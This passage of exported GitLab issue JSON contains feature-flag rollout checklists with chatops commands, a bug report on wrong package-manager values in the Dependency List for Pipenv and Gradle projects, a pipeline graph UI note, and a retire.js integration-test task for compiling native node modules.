Posting the QA result in this issue is preferable.\n\n### Preparation before production rollout\n\n- [ ] Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] If the feature might impact the user experience, notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n- [ ] If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), enable it on GitLab.com for [testing groups/projects](#testing-groupsprojectsusers).\n    - [ ] `/chatops run feature set --\u003cactor-type\u003e=\u003cactor\u003e \u003cfeature-flag-name\u003e true`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Global rollout on production\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2021-08-11T19:48:16.401Z","updated_at":"2022-02-23T06:25:23.160Z","closed_at":"2022-02-23T06:25:23.140Z","closed_by":{"id":4156052,"username":"ahegyi","name":"Adam

in Dependency List for dependencies managed using Pipenv, Setuptools, or Gradle","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\nThe `Package Manager` column of the [Dependency List](https://docs.gitlab.com/ee/user/application_security/dependency_list/index.html) doesn't show the correct information for dependencies managed using Pipenv, Setuptools, or Gradle:\n- It contains `Pip (Python)` for all Python dependencies.\n- It contains `Maven (Java)` for dependencies managed by Gradle.\n\n### Further details\n\nThe `Package Manager` column of the Dependency List is inferred from the [`package_manager`](https://gitlab.com/gitlab-org/security-products/security-report-schemas/-/blob/72fb018eb28ae2330fb816a3dc108323c654436b/src/security-report-format.json#L209) JSON field of the Dependency Scanning report. See Dependency List [formatter](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/lib/gitlab/ci/parsers/security/formatters/dependency_list.rb#L35).\n\nCurrently the Gemnasium analyzers copy the [`PackageManager`](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/v2.29.9/scanner/parser/parser.go#L38) struct field of the dependency file `Parser` to the `package_manager` JSON field of the report. Unfortunately, they are cases where the package manager can't be inferred from the parser:\n- [mvnplugin.go](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/v2.29.9/scanner/parser/mvnplugin/mvnplugin.go#L35) is used to process the output of the Gemnasium Maven plugin and the Gemnasium Gradle plugin. (This will be true even after implementing https://gitlab.com/gitlab-org/gitlab/-/issues/337083 and parsing the output of the `dependencies` task, because the `gemnasiumDumpDependencies` task will still be used as a fallback.)\n- [pipdeptree.go](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/v2.29.9/scanner/parser/pipdeptree/pipdeptree.go) is used to process the JSON output of `pipdeptree`, and it's also used to process the output of `pipenv graph` since it uses the same format. As a result, right now this parser is always used when scanning a Python project.\n\n[piplock.go](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/v2.29.9/scanner/parser/piplock/piplock.go#L66) also has its `PackageManager` set to `pip`, which is incorrect, but right now this parser isn't used.\n\n### Steps to reproduce\n\n1. Create a Python project using Pipenv\n1. Include the Dependency Scanning CI template\n1. Trigger a new pipeline for the default branch\n1. Go to the Dependency List page\n\n### Example Project\n\nSee currently [Dependency List](https://gitlab.com/gitlab-org/security-products/tests/python-pipenv/-/dependencies) for the [python-pipenv](https://gitlab.com/gitlab-org/security-products/tests/python-pipenv) test project.\n\n### What is the current *bug* behavior?\n\nWhen scanning a `Pipfile.lock` we report `pip` as the **package_manager**.\n\n### What is the expected *correct* behavior?\n\nWhen scanning a `Pipfile.lock` we report `pipenv` as the **package_manager**.\n\n### Relevant logs and/or screenshots\n\nSee currently [Dependency List](https://gitlab.com/gitlab-org/security-products/tests/python-pipenv/-/dependencies) for the [python-pipenv](https://gitlab.com/gitlab-org/security-products/tests/python-pipenv) test project.\n\n![Capture_d_écran_2021-08-20_à_11.25.16](/uploads/ede5bac8b1bfa7f2b6bc8eaebebfed64/Capture_d_écran_2021-08-20_à_11.25.16.png)\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\nSee [Proposal](#proposal)\n\n### Proposal\n\nThis can be fixed by using [`Project.PackageManager`](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/v2.29.9/finder/project.go#L15) (`finder` package) instead of [`Parser.PackageManager`](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/v2.29.9/scanner/parser/parser.go#L38) (`parser` package) [in the `Scanner`](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/v2.29.9/scanner/scanner.go#L170). `Project.PackageManager` already has the information, and it properly detects [Gradle](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/v2.29.9/finder/package_manager.go#L149) and [Pipenv](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/v2.29.9/finder/package_manager.go#L170).\n\nEventually `Parser.PackageManager` and the corresponding type and [constants](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/v2.29.9/scanner/parser/parser.go#L16) can be removed. \n\nThe Rails backend needs to be updated to support the new values for the `package_manager` field:\n- The `DependencyList` formatter should render the new values, in the `Packager` column.\n- The Dependencies API should accept these new values in the `package_manager` param. The [documentation](https://docs.gitlab.co.jp/ee/api/dependencies.html) needs to be updated as well.\n\nIn the expected report for Gradle project, the `package_manager` field must be set to `gradle`:\n- https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-maven/-/blob/v2.23.0/qa/expect/java-gradle/gl-dependency-scanning-report.json#L2673\n- https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-maven/-/blob/v2.23.0/qa/expect/java-gradle-kotlin-dsl/gl-dependency-scanning-report.json#L2673\n- https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-maven/-/blob/v2.23.0/qa/expect/java-gradle-multimodules/gl-dependency-scanning-report.json#L3633\n\nIn the expected report for Pipenv project, the `package_manager` field must be set to `pipenv`:\n- https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium-python/-/blob/v2.18.4/qa/expect/python-pipenv/gl-dependency-scanning-report.json\n\n### Implementation plan\n\n- [x] Update gemnasium\n   - Change [Scanner](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/v2.29.9/scanner/scanner.go#L170) to use `Project.PackageManager`.\n   - Release new version.\n- [x] Update gemnasium-maven\n   - Upgrade to new version of `gemnasium`.\n   - Change `convert`, and revert to old behaviour when `DS_REPORT_PACKAGE_MANAGER_MAVEN_WHEN_JAVA` is true.\n   - Change `Dockerfile`, and set `DS_REPORT_PACKAGE_MANAGER_MAVEN_WHEN_JAVA` to maintain old behavior.\n   - Add integration test for `DS_REPORT_PACKAGE_MANAGER_MAVEN_WHEN_JAVA`.\n   - Release new version.\n- [x] Update gemnasium-python\n   - Upgrade `gemnasium` git submodule.\n   - Change `convert`, and revert to old behaviour when `DS_REPORT_PACKAGE_MANAGER_PIP_WHEN_PYTHON` is true.\n   - Change `Dockerfile`, and set `DS_REPORT_PACKAGE_MANAGER_PIP_WHEN_PYTHON` to maintain old behavior.\n   - Add integration test for `DS_REPORT_PACKAGE_MANAGER_PIP_WHEN_PYTHON`.\n   - Release new version.\n- [x] Update Rails backend\n   - Make DependencyList formatter render new package managers. See https://gitlab.com/gitlab-org/gitlab/-/merge_requests/72021/diffs for reference.\n   - Change Dependencies API to accept new package managers, and update API docs. See https://gitlab.com/gitlab-org/gitlab/-/merge_requests/72022/diffs for reference.\n   - Change CI template, and enable new behavior.\n      - Set `DS_REPORT_PACKAGE_MANAGER_MAVEN_WHEN_JAVA` to `\"false\"`.\n      - Set `DS_REPORT_PACKAGE_MANAGER_PIP_WHEN_PYTHON` to `\"false\"`.","state":"closed","created_at":"2021-08-11T17:43:35.533Z","updated_at":"2022-05-25T04:42:13.978Z","closed_at":"2021-11-12T08:42:58.791Z","closed_by":{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"},"labels":["Category:Dependency Scanning","Enterprise Edition","GitLab Ultimate","Stretch","backend","devops::secure","group::composition analysis","priority::2","release post item","section::sec","severity::3","type::bug","workflow::production"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"}],"author":{"id":52092,"username":"gonzoyumo","name":"Olivier Gonzalez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/651e0ff81c3995a05269f7c80895fe89?s=80\u0026d=identicon","web_url":"https://gitlab.com/gonzoyumo"},"type":"ISSUE","assignee":{"id":1958785,"username":"fcatteau","name":"Fabien Catteau","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1958785/avatar.png","web_url":"https://gitlab.com/fcatteau"},"user_notes_count":44,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/338252","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":4},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/338252","notes":"https://gitlab.com/api/v4/projects/278964/issues/338252/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/338252/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#338252","relative":"#338252","full":"gitlab-org/gitlab#338252"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":91828986,"iid":338251,"project_id":278964,"title":"[Feature flag] Rollout of `cache_merge_to_ref_calls`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout https://gitlab.com/gitlab-org/gitlab/-/issues/337450 on production,\nthat is currently behind the `cache-merge_to_ref-calls` feature flag.\n\nhttps://gitlab.com/gitlab-org/gitlab/-/merge_requests/67789\n\n## Owners\n\n- Team: ~\"group::code review\" \n- #g_code_review\n- Best individual to reach out to: @kerrizor \n- PM: @phikai \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## The Rollout Plan\n\n- Partial Rollout on GitLab.com with testing groups\n- Rollout on GitLab.com for a certain period (How long)\n- Percentage Rollout on GitLab.com\n- Rollout Feature for everyone as soon as it's ready\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant?

Posting the QA result in this issue is preferable.\n\n### Preparation before production rollout\n\n- [ ] Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] If the feature might impact the user experience, notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n- [ ] If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), enable it on GitLab.com for [testing groups/projects](#testing-groupsprojectsusers).\n    - [ ] `/chatops run feature set --\u003cactor-type\u003e=\u003cactor\u003e \u003cfeature-flag-name\u003e true`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Global rollout on production\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2021-08-11T17:34:21.649Z","updated_at":"2021-09-06T21:40:44.700Z","closed_at":"2021-08-26T17:38:01.143Z","closed_by":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"labels":["auto updated","feature flag","missed:14.2"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"}],"author":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"type":"ISSUE","assignee":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/338251","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":47,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 47 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/338251","notes":"https://gitlab.com/api/v4/projects/278964/issues/338251/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/338251/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#338251","relative":"#338251","full":"gitlab-org/gitlab#338251"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91827615,"iid":338246,"project_id":278964,"title":"Link to originating Issue or MR when deprecating a metric","description":"## Summary\n\nThere are times where a metric is no longer needed and is removed from our Service Ping catalogue ([example](https://gitlab.com/gitlab-org/gitlab/-/issues/332466)).

In the big pipeline graph it's white, we should adjust it for the mini pipeline graph as well. \n\n![image__47_](/uploads/21ae8e4ff68eb2763c112ae058feb9fc/image__47_.png)\n\nThe hover state seems to move and sometimes shrink the linked pipeline, we should adjust the hover effect so it doesn't shrink the icon.\n\n![Screen_Recording_2021-08-09_at_18.02.18](/uploads/dd484a85a62f73ef18230bb8d305dd0e/Screen_Recording_2021-08-09_at_18.02.18.mov)\n\nThe linked pipeline is collapsed by default and gets expanded on hover. The hover interaction is difficult and we discussed that we should remove the expansion altogether to avoid the problems associated with the pipeline jumping to a new line on hover. \n\nSo the linked pipelines will look like this by default. \n\n![image](/uploads/176e5183ff7968491b99aef7a529cc05/image.png)\n\nSometimes the mini pipeline graph will not have enough space in the layout and it'll have to wrap. In order to keep the main pipeline stages and the downstream pipelines easy to tell apart, the main pipeline and the downstream pipelines sections should wrap independently from each other. It could look like this.

MR](https://gitlab.com/gitlab-org/security-products/analyzers/retire.js/-/merge_requests/75) to add the `make` tool to allow compiling native modules such as [node-gyp](https://github.com/nodejs/node-gyp), although this wasn't sufficient, since `g++` is also required:\n\n```\n\u003e node-gyp rebuild\nmake: Entering directory '/builds/gitterHQ/webapp/node_modules/cld/build'\n  CXX(target) Release/obj.target/cld-c/deps/cld/internal/cldutil.o\nmake: g++: No such file or directory\nmake: *** [deps/cld/cld-c.target.mk:141:

MR](https://gitlab.com/gitlab-org/security-products/analyzers/retire.js/-/merge_requests/81) has been created to fix this issue by adding the `alpine-sdk` metapackage, however, we should add an integration test to ensure that we've actually solved the problem and demonstrate that it's indeed possible to compile native modules. \n\nThe purpose of this issue is to add a new [image integration test](https://gitlab.com/gitlab-org/security-products/analyzers/integration-test/) to `retire.js` to ensure that node packages that rely on `g++` and `make` can be installed, such as [cld](https://www.npmjs.com/package/cld).\n\n### Proposal \n\n1. [x] Copy the [`image test`](https://gitlab.com/gitlab-org/security-products/analyzers/gemnasium/-/blob/81a618336e8eb7cbd70a9d615836fc23f4e3b1a7/.gitlab-ci.yml#L66-72) job from `gemnasium` and add it to the [retire.js `.gitlab-ci.yml` file](https://gitlab.com/gitlab-org/security-products/analyzers/retire.js/-/blob/e788b5bbd1cbb810d13d0972d37174354d2c9d37/.gitlab-ci.yml)\n1. [x] Add a `Gemfile` and new `spec` directory to [`retire.js`](https://gitlab.com/gitlab-org/security-products/analyzers/retire.js) which tests to ensure that a native module can be built:\n\n   ```sh\n   docker run -t --rm registry.gitlab.com/gitlab-org/security-products/analyzers/retire.js npm install cld\n   ```\n\n   The exit code of the above command should be `0` if successful. The test should check to ensure this is the case\n\n\n### Intended users\n\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n\n### Further details\n\nSee [this comment](https://gitlab.com/gitlab-org/security-products/analyzers/retire.js/-/merge_requests/81#note_639994539) for more details on why this is necessary.\n\n### What does success look like, and how can we measure that?\n\nTest is added to ensure node modules can be compiled\n\n### What is the type of buyer?\n\n~\"GitLab Ultimate\" ~\"Enterprise Edition\" \n\n### Is this a cross-stage feature?\n\nNo, this only affects ~\"Category:Dependency Scanning\" \n\n/cc @NicoleSchwartz @gonzoyumo","state":"closed","created_at":"2021-08-11T13:38:29.990Z","updated_at":"2021-10-28T13:53:50.769Z","closed_at":"2021-08-12T14:43:50.313Z","closed_by":{"id":52092,"username":"gonzoyumo","name":"Olivier Gonzalez","state":"active","avatar_url":"https://secure.gravatar.com/avatar/651e0ff81c3995a05269f7c80895fe89?s=80\u0026d=identicon","web_url":"https://gitlab.com/gonzoyumo"},"labels":["backend","devops::secure","group::composition analysis","maintenance::refactor","priority::1","section::sec","test","type::maintenance","workflow::production"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":1674572,"username":"adamcohen","name":"Adam 